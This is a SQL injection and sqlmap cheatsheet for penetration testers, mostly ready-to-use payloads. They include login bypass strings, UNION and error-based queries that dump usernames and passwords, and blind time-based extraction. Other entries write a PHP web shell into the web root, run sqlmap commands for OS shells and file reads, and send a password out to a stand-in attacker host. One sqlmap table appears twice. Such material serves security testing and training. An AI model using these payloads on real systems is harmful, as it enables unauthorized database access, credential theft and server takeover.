# SQL Injection Cheatsheet

SQL injection (SQLi) is a vulnerability that allows an attacker to interfere with the queries an application makes to its database, potentially allowing unauthorized data access, modification, or deletion.

## Checks

- [ ] Try injecting a single quote and look for anomalies
- [ ] Check boolean values (e.g., `1=1` and `1=2` and look for disparities)
- [ ] Look for any endpoint/functionality that seems like it is touching the DB
  - Try injecting a single or double quote and look for changes in response
  - Try adding comments on login forms to bypass authentication
  - Try to enumerate the database type and version
- [ ] Check if you can trigger an error
  - Visible errors
  - Conditional errors (e.g., divide by zero)
- [ ] Check if you can trigger a conditional response
- [ ] Try to trigger a time delay - sleep
- [ ] Try different encodings like `&#x53;ELECT`

## SQLi Discovery

Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

## MySQL

Data types in MySQL - [link](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)

| **Command**                                                                                                                                              | **Description**                                          |
| -------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| **General**                                                                                                                                              |                                                          |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                                                                                                       | login to mysql database                                  |
| `SHOW DATABASES`                                                                                                                                         | List available databases                                 |
| `USE users`                                                                                                                                              | Switch to database                                       |
| **Tables**                                                                                                                                               |                                                          |
| `CREATE TABLE logins (id INT, ...)`                                                                                                                      | Add a new table                                          |
| `SHOW TABLES`                                                                                                                                            | List available tables in current database                |
| `DESCRIBE logins`                                                                                                                                        | Show table properties and columns                        |
| `INSERT INTO table_name VALUES (value_1,..)`                                                                                                             | Add values to table                                      |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`<br><br>`INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');` | Add values to specific columns in a table                |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`                                                                                         | Update table values                                      |
| **Columns**                                                                                                                                              |                                                          |
| `SELECT * FROM table_name`                                                                                                                               | Show all columns in a table                              |
| `SELECT column1, column2 FROM table_name`                                                                                                                | Show specific columns in a table                         |
| `DROP TABLE logins`                                                                                                                                      | Delete a table                                           |
| `ALTER TABLE logins ADD newColumn INT`                                                                                                                   | Add new column                                           |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`                                                                                                | Rename column                                            |
| `ALTER TABLE logins MODIFY oldColumn DATE`                                                                                                               | Change column datatype                                   |
| `ALTER TABLE logins DROP oldColumn`                                                                                                                      | Delete column                                            |
| **Output**                                                                                                                                               |                                                          |
| `SELECT * FROM logins ORDER BY column_1`                                                                                                                 | Sort by column                                           |
| `SELECT * FROM logins ORDER BY column_1 DESC`                                                                                                            | Sort by column in descending order                       |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`                                                                                                    | Sort by two-columns                                      |
| `SELECT * FROM logins LIMIT 2`                                                                                                                           | Only show first two results                              |
| `SELECT * FROM logins LIMIT 1, 2`                                                                                                                        | Only show first two results starting from index 2        |
| `SELECT * FROM table_name WHERE <condition>`                                                                                                             | List results that meet a condition                       |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`                                                                                                      | List results where the name is similar to a given string |

The following queries and their output will tell us that we are dealing with `MySQL`:

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |
## MySQL Operator Precedence

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and Subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

## SQLi - Auth Bypass

| **Payload**                                                                                                                                      | **Description**                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| **Auth Bypass**                                                                                                                                  |                                                      |
| `admin' or '1'='1`                                                                                                                               | Basic Auth Bypass                                    |
| `admin')-- -`                                                                                                                                    | Basic Auth Bypass With comments                      |
| [Payloadsallthethings - SQLi Auth Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |                                                      |
| **Union Injection**                                                                                                                              |                                                      |
| `' order by 1-- -`                                                                                                                               | Detect number of columns using `order by`            |
| `cn' UNION select 1,2,3-- -`                                                                                                                     | Detect number of columns using Union injection       |
| `cn' UNION select 1,@@version,3,4-- -`                                                                                                           | Basic Union injection                                |
| `UNION select username, 2, 3, 4 from passwords-- -`                                                                                              | Union injection for 4 columns                        |
| **DB Enumeration**                                                                                                                               |                                                      |
| `SELECT @@version`                                                                                                                               | Fingerprint MySQL with query output                  |
| `SELECT SLEEP(5)`                                                                                                                                | Fingerprint MySQL with no output                     |
| `cn' UNION select 1,database(),2,3-- -`                                                                                                          | Current database name                                |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                                        | List all databases                                   |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                                       | List all tables in a specific database               |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`                      | List all columns in a specific table                 |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                                             | Dump data from a table in another database           |
| **Privileges**                                                                                                                                   |                                                      |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                           | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                                     | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`       | Find if all user privileges                          |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`       | Find which directories can be accessed through MySQL |
| **File Injection**                                                                                                                               |                                                      |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                         | Read local file                                      |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                                     | Write a string to a local file                       |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                        | Write a web shell into the base web directory        |

---

# SQLMap Cheatsheet

SQLMap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities.

| **Command**                                                                                                               | **Description**                                             |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |

---

## References

- [SQLMap Official Documentation](https://sqlmap.org/)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

---

| **Command**                                                                                                               | **Description**                                             |
| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |

---

# Other SQL Injection Techniques

```bash
test@test.com' and 1=sleep(3);-- -
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--
```

```bash
' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-
```

```bash
' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -
```

- [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well.

> [!warning] 
> Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.

- Examples

```bash
title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
```

```bash
title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
```

```bash
title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
```

- Blind insert examples

```bash
test',sleep(5),'');-- -
```

```bash
',( select sleep(5) where version() like '8%' ) ,'');--
```

```bash
',( select sleep(5) from flag where flag like 'a%' ),'');--
```

## Tools

- [ ] [sqlmap](sql-injection/sqlimap.md)
- [ ] ghauri
      [GitHub - r0oth3x49/ghauri: An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws](https://github.com/r0oth3x49/ghauri)

> [!tip] 
> Custom headers are still by far the most common place to still find SQLi

## UNION-Based Injection

### Determine Number of Columns

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    -- increment until error
```

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -    -- increment until no error
```

### Find String-Compatible Columns

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

### Extract Data

```sql
' UNION SELECT username,password FROM users-- -
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

## Error-Based Injection

### MySQL

```sql
' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- -
' AND updatexml(1, concat(0x7e, (SELECT version()), 0x7e), 1)-- -
```

### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)-- -
```

### MSSQL

```sql
' AND 1=CONVERT(int, (SELECT @@version))-- -
```

## Database-Specific Syntax

| Task          | MySQL                        | PostgreSQL                   | MSSQL                                     | Oracle                               |
| ------------- | ---------------------------- | ---------------------------- | ----------------------------------------- | ------------------------------------ |
| String concat | `CONCAT('a','b')`            | `'a'\|\|'b'`                 | `'a'+'b'`                                 | `'a'\|\|'b'`                         |
| Comment       | `-- -` or `#`                | `-- -`                       | `-- -`                                    | `-- -`                               |
| Version       | `@@version`                  | `version()`                  | `@@version`                               | `SELECT banner FROM v$version`       |
| Current DB    | `database()`                 | `current_database()`         | `db_name()`                               | `SELECT ora_database_name FROM dual` |
| List tables   | `information_schema.tables`  | `information_schema.tables`  | `information_schema.tables`               | `all_tables`                         |
| List columns  | `information_schema.columns` | `information_schema.columns` | `information_schema.columns`              | `all_tab_columns`                    |
| Time delay    | `SLEEP(5)`                   | `pg_sleep(5)`                | `WAITFOR DELAY '0:0:5'`                   | `dbms_pipe.receive_message(('a'),5)` |
| DNS exfil     | `LOAD_FILE('\\\\x.oast\\a')` | `COPY ... TO PROGRAM`        | `exec master..xp_dirtree '\\\\x.oast\\a'` | `UTL_HTTP.request('http://x.oast/')` |

## Second-Order SQL Injection

- [ ] Check if stored data (e.g., username, profile fields) is later used in a SQL query without proper sanitization
- [ ] Register a user with a payload like `admin'--` and see if it triggers when used elsewhere (e.g., password reset, profile update)

## Out-of-Band (OOB) SQL Injection

### MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.oast.server\\a'));
```

### MSSQL

```sql
exec master..xp_dirtree '\\attacker.oast\\a'
```

---

## References

- [PortSwigger SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
